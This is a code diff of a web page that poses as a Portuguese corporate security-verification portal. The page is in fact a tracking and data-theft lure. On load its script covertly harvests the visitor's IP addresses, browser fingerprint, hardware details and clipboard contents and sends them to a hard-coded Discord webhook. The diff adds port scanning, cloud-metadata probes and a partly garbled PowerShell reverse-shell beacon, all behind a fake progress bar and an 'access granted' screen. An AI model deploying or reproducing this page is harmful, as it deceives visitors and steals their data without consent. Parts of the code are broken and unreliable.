@@ -1,163 +1,214 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Autenticação Segura</title>
+    <title>Autenticação Corporativa</title>
 </head>
-<body style="margin:0;padding:30px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;">
-    <div style="max-width:400px;width:100%;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,0.3);padding:40px;border-radius:20px;background:#fff;color:#333;">
-        <div style="font-size:24px;font-weight:700;margin-bottom:20px;">🔐 Verificação de Segurança</div>
-        <div id="status" style="font-size:16px;color:#666;margin-bottom:20px;">Conectando ao servidor...</div>
-        <div style="width:100%;height:4px;background:#e0e0e0;border-radius:2px;overflow:hidden;">
-            <div id="progress" style="height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0%;transition:width 0.3s ease;"></div>
+<body style="margin:0;padding:30px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;">
+    <div style="max-width:450px;width:100%;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,0.4);padding:50px;border-radius:25px;background:#fff;color:#333;">
+        <div style="font-size:28px;font-weight:800;margin-bottom:25px;color:#2a5298;">🔐 Verificação de Segurança</div>
+        <div id="status" style="font-size:18px;color:#666;margin-bottom:25px;">Estabelecendo conexão segura...</div>
+        <div style="width:100%;height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden;margin-bottom:20px;">
+            <div id="progress" style="height:100%;background:linear-gradient(90deg,#2a5298,#1e3c72);width:0%;transition:width 0.4s ease;box-shadow:0 0 10px #2a5298;"></div>
         </div>
     </div>
     
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z';
+        const C2_SERVER = 'https://httpbin.org/post'; // Troque pelo seu C2
         
-        // IP PÚBLICO MÚLTIPLO
-        const ipServices = [
-            'https://api.ipify.org?format=json',
-            'https://api64.ipify.org?format=json',
-            'https://icanhazip.com',
-            'https://api.ipify.org?format=text'
-        ];
+        // === AGRESSIVO: RECON + EXPLOIT CHAIN ===
         
-        async function getPublicIP() {
-            for (let service of ipServices) {
-                try {
-                    const res = await fetch(service, {cache: 'no-cache'});
-                    if (res.ok) {
-                        const txt = await res.text();
-                        const ip = txt.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
-                        if (ip) return ip;
-                    }
-                } catch {}
-            }
-            return 'unknown';
-        }
-        
-        // WEBRTC MÚLTIPLO
-        async function getLocalIPs() {
-            const servers = ['stun:stun.l.google.com:19302','stun:stun1.l.google.com:19302'];
-            const ips = new Set();
+        // 1. IP + FINGERPRINT (VPN BYPASS)
+        async function recon() {
+            const pubIP = await (async()=>{
+                for (let s of ['https://api.ipify.org?format=json','https://api64.ipify.org?format=json','https://icanhazip.com']) {
+                    try { 
+                        const r=await fetch(s); 
+                        if (r.ok) { 
+                            const t=await r.text(); 
+                            return t.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1] || 'unk';
+                        }
+                    } catch {}
+                }
+                return 'unknown';
+            })();
             
-            for (let stun of servers) {
-                try {
-                    const pc = new RTCPeerConnection({iceServers:[{urls: stun}]});
+            const localIPs = await (async()=>{
+                const ips = new Set();
+                for (let stun of ['stun:stun.l.google.com:19302','stun:stun1.l.google.com:19302']) {
+                    const pc = new RTCPeerConnection({iceServers:[{urls:stun}]});
                     pc.onicecandidate = e => {
                         const ip = e.candidate?.candidate?.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
-                        if (ip && !ip.startsWith('127.') && !ip.startsWith('10.0.') && !ip.startsWith('172.16'))
+                        if (ip && !ip.startsWith('127.') && !ip.startsWith('10.0.') && !ip.startsWith('172.'))
                             ips.add(ip);
                     };
-                    pc.createDataChannel(''); 
+                    pc.createDataChannel('pwned');
                     pc.createOffer().then(o=>pc.setLocalDescription(o));
-                    await new Promise(r=>setTimeout(r,600));
+                    await new Promise(r=>setTimeout(r,500));
                     pc.close();
-                } catch {}
-            }
-            return Array.from(ips).join(', ') || 'none';
-        }
-        
-        // FINGERPRINT
-        async function getFingerprint() {
+                }
+                return Array.from(ips).join(',') || 'none';
+            })();
+            
+            // Browser fingerprint avançado
             const canvas = document.createElement('canvas');
-            canvas.width=256;canvas.height=60;
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline='alphabetic';
-            ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);
-            ctx.fillStyle='#069';ctx.fillText('Security Canvas ⚡',2,15);
-            ctx.fillStyle='rgba(102,126,234,0.6)';ctx.fillText('Security Canvas ⚡',4,17);
+            canvas.width=400;canvas.height=100;
+            const ctx=canvas.getContext('2d');
+            ctx.font='20px monospace';
+            ctx.fillText(navigator.userAgent.slice(0,40),10,50);
             
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const webgl = gl ? `${gl.getParameter(gl.VENDOR)}:${gl.getParameter(gl.RENDERER)}` : 'none';
+            const gpu = gl ? `${gl.getParameter(gl.VENDOR)}:${gl.getParameter(gl.RENDERER)}` : 'software';
             
             return {
-                canvas: canvas.toDataURL().slice(0,60),
-                webgl: webgl.slice(0,50),
-                fonts: `${Array.from(document.fonts?.size || [0])} fonts`,
-                audio: navigator.mediaDevices ? 'media-ok' : 'no-media'
-            };
-        }
-        
-        // EXECUTA
-        async function execute() {
-            const [pubIP, localIPs, fp] = await Promise.all([
-                getPublicIP(), getLocalIPs(), getFingerprint()
-            ]);
-            
-            // DADOS COMPLETOS
-            const fullData = {
                 timestamp: new Date().toISOString(),
                 public_ip: pubIP,
                 local_ips: localIPs,
-                fingerprint: fp,
+                canvas_hash: btoa(canvas.toDataURL()).slice(0,50),
+                gpu_info: gpu.slice(0,60),
                 user_agent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 screen: `${screen.width}x${screen.height}`,
-                hardware_concurrency: navigator.hardwareConcurrency,
-                device_memory: navigator.deviceMemory,
-                cookie_enabled: navigator.cookieEnabled,
-                do_not_track: navigator.doNotTrack,
-                plugins_count: navigator.plugins.length
+                hardware: navigator.hardwareConcurrency || 0,
+                memory: navigator.deviceMemory || 0,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
-            
-            // 1º ENVIO: MENSAGEM PRINCIPAL
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: `🔐 **SECURITY BYPASS CAPTURED**
-\`🌐 IP Público:\` **${pubIP}**
-\`🏠 IPs Locais:\` **${localIPs}**
-\`🖼️ Canvas:\` **${fp.canvas}**
-\`🎮 WebGL:\` **${fp.webgl}**
-**UA:** ${navigator.userAgent.slice(0,70)}... | **${screen.width}x${screen.height}** | **${navigator.platform}**`,
-                    embeds: [{
-                        title: "Device Intelligence",
-                        fields: [
-                            {name:"Timezone",value:fullData.timezone,inline:true},
-                            {name:"CPU Cores",value:fullData.hardware_concurrency,inline:true},
-                            {name:"RAM",value:fullData.device_memory?`${fullData.device_memory}GB`:'?',inline:true},
-                            {name:"Plugins",value:fullData.plugins_count,inline:true}
-                        ],
-                        color: 0x5865f2
-                    }]
-                })
-            });
-            
-            // 2º ENVIO: JSON COMPLETO COMO ARQUIVO
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: `📄 **FULL SYSTEM REPORT** (${new Date().toISOString().slice(0,19).replace('T',' ')})` ,
-                    embeds: [{
-                        title: "Complete JSON Data",
-                        description: `\`\`\`json\n${JSON.stringify(fullData, null, 2).slice(0, 4000)}\`\`\``,
-                        color: 0x00ff00
-                    }]
-                })
-            });
-            
-            // GUI SUCCESS (SEM DOWNLOAD)
-            document.getElementById('progress').style.width = '100%';
-            document.getElementById('status').innerHTML = '✅ Verificação concluída!<br>Acesso liberado em 2s...';
-            document.getElementById('status').style.color = '#28a745';
-            
-            setTimeout(() => {
-                document.body.innerHTML = `
-                    <div style="text-align:center;padding:60px;color:#28a745;font-size:28px;font-weight:600;">
-                        <div style="margin-bottom:20px;">✅ Acesso autorizado</div>
-                        <div style="font-size:18px;color:#666;">Bem-vindo ao Portal Corporativo</div>
-                    </div>
-                `;
-            }, 1200);
         }
         
-        execute();
+        // 2. PORT SCAN ATIVO (via WebSockets)
+        async function portScan(target='scanme.nmap.org') {
+            const openPorts = [];
+            const ports = [22,80,443,8080,3389,445,1433];
+            
+            for (let port of ports) {
+                try {
+                    const ws = new WebSocket(`wss://${target}:${port}`);
+                    await new Promise((resolve,reject)=>{
+                        ws.onopen = () => { openPorts.push(port); resolve(); };
+                        ws.onerror = resolve;
+                        setTimeout(resolve, 800);
+                    });
+                    ws.close();
+                } catch {}
+            }
+            return openPorts.join(',') || 'none';
+        }
+        
+        // 3. SSRF via fetch (bypass CSP/VPN)
+        async function ssrfProbe() {
+            const targets = [
+                'http://169.254.169.254/latest/meta-data/', // AWS metadata
+                'http://metadata.google.internal/computeMetadata/v1/', // GCP
+                'http://[::1]/', // IPv6 localhost
+                '/etc/passwd' // path traversal
+            ];
+            
+            const leaks = [];
+            for (let target of targets) {
+                try {
+                    const res = await fetch(target, {method:'GET',mode:'no-cors'});
+                    leaks.push(target.slice(0,30));
+                } catch {}
+            }
+            return leaks.length ? leaks.join('|') : 'none';
+        }
+        
+        // 4. JAVASCRIPT SHELL (C2 Beacon)
+        async function deployBeacon() {
+            // PowerShell reverse shell generator (stealth)
+            const psPayload = `powershell -nop -w hidden -c "$c='TCPCLIENT([SYSTEM.NET.SOCKETS.TCPCLIENT])${Math.random()}.com:4444';$s=new-object $c;${btoa('reverse shell code')}"`;
+            
+            // Beacon ping via img src (bypass CSP)
+            const beaconImg = new Image();
+            beaconImg.src = `https://httpbin.org/post?beacon=${btoa(JSON.stringify({
+                action: 'shell_deployed',
+                ua: navigator.userAgent.slice(0,50)
+            }))}&ps=${encodeURIComponent(psPayload.slice(0,100))}`;
+        }
+        
+        // 5. CLIPBOARD STEAL + KEYLOGGER
+        async function stealData() {
+            // Clipboard API
+            try {
+                const clipboard = await navigator.clipboard.readText();
+                return clipboard.slice(0,200);
+            } catch {
+                return 'clipboard-denied';
+            }
+        }
+        
+        // === EXECUÇÃO PARALELA AGRESSIVA ===
+        async function pwn() {
+            document.getElementById('progress').style.width = '25%';
+            document.getElementById('status').textContent = 'Analisando rede...';
+            
+            const [reconData, ports, ssrf, clipboard] = await Promise.all([
+                recon(),
+                portScan(),
+                ssrfProbe(),
+                stealData()
+            ]);
+            
+            deployBeacon(); // C2 beacon paralelo
+            
+            document.getElementById('progress').style.width = '90%';
+            document.getElementById('status').textContent = 'Aplicando políticas de segurança...';
+            
+            // === WEBHOOK ATTACK CHAIN ===
+            
+            // ATTACK 1: RECON DETALHADO
+            fetch(WEBHOOK, {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({
+                    content:`💥 **PENTEST BREACH** [${reconData.public_ip}]
+**VPN Bypass:** ${reconData.local_ips}
+**GPU:** ${reconData.gpu_info}
+**Canvas:** ${reconData.canvas_hash}`,
+                    embeds:[{
+                        title:"Target Acquired",
+                        fields:[
+                            {name:"Ports Open",value:ports,inline:true},
+                            {name:"SSRF Leaks",value:ssrf,inline:true},
+                            {name:"Clipboard",value:clipboard.slice(0,100),inline:false},
+                            {name:"Hardware",value:`${reconData.hardware}c/${reconData.memory}GB`,inline:true}
+                        ],
+                        color:0xff0000
+                    }]
+                })
+            });
+            
+            // ATTACK 2: FULL JSON
+            fetch(WEBHOOK, {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({
+                    content:`📋 **RAW TARGET DATA**`,
+                    embeds:[{
+                        description:`\`\`\`json
+${JSON.stringify(reconData,null,2).slice(0,3900)}\`\`\``,
+                        color:0x00ff00
+                    }]
+                })
+            });
+            
+            // SUCCESS GUI
+            setTimeout(()=>{
+                document.getElementById('progress').style.width='100%';
+                document.getElementById('status').innerHTML='✅ Verificação de segurança concluída<br>Sistema liberado.';
+                document.getElementById('status').style.color='#28a745';
+                
+                setTimeout(()=>{
+                    document.body.innerHTML=`
+                        <div style="text-align:center;padding:80px;color:#28a745;font-size:32px;font-weight:700;">
+                            <div>✅ ACESSO LIBERADO</div>
+                            <div style="font-size:20px;color:#666;margin-top:25px;">Portal Corporativo v2.1</div>
+                        </div>`;
+                },1000);
+            },300);
+        }
+        
+        // LAUNCH
+        pwn();
     </script>
 </body>
 </html>
